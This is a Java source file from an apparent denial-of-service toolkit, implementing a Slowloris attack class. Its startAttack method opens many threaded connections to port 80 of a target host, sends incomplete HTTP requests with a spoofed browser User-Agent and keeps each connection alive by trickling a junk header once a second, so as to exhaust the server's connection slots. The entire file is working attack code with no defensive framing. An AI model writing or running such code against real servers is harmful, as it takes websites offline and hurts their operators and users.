/*
 * To change this license header, choose License Headers in Project Properties.
 * To change this template file, choose Tools | Templates
 * and open the template in the editor.
 */
package org.willi.dos.methods;

import java.io.PrintWriter;
import java.net.Socket;
import org.willi.dos.interfaces.HelpPrinter;
import org.willi.dos.interfaces.Attack;
/**
 *
 * @author phamm
 */
public class SlowLoris implements HelpPrinter, Attack
{
    private String host;
    private int threads;
    private int resends_per_thread;
    
    public SlowLoris(String host, int threads, int resends_per_thread)
    {
        this.host = host;
        this.threads = threads;
        this.resends_per_thread = resends_per_thread;
    }

    @Override
    public void printhelp()
    {
        //TODO: useful help....
        System.out.println("Usage: ....");
    }

    @Override
    public void startAttack()
    {
        for(int i = 0; i < threads; i++)
        {
            new Thread(new Runnable()
            {
                @Override
                public void run()
                {
                    try
                    {
                        Socket socket = new Socket(host, 80);
                        PrintWriter out = new PrintWriter(socket.getOutputStream());
                        out.println("GET / HTTP/1.1");
                        out.println("Host: " + host + "");
                        out.println("User-Agent: Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1; Trident/4.0; .NET CLR 1.1.4322; .NET CLR 2.0.503l3; .NET CLR 3.0.4506.2152; .NET CLR 3.5.30729; MSOffice 12)");
                        out.println("Content-Length: 42");
                        for(int i = 0; i < resends_per_thread; i++)
                        {
                            out.println("X-a: b"); //Dem Header weitere Daten hinzufügen
                            Thread.sleep(1000);
                        }
                        out.close();
                        socket.close();

                    }
                    catch (Exception e)
                    {
                        e.printStackTrace();
                    }
                }
            }).start();
}
    }
    
    
}
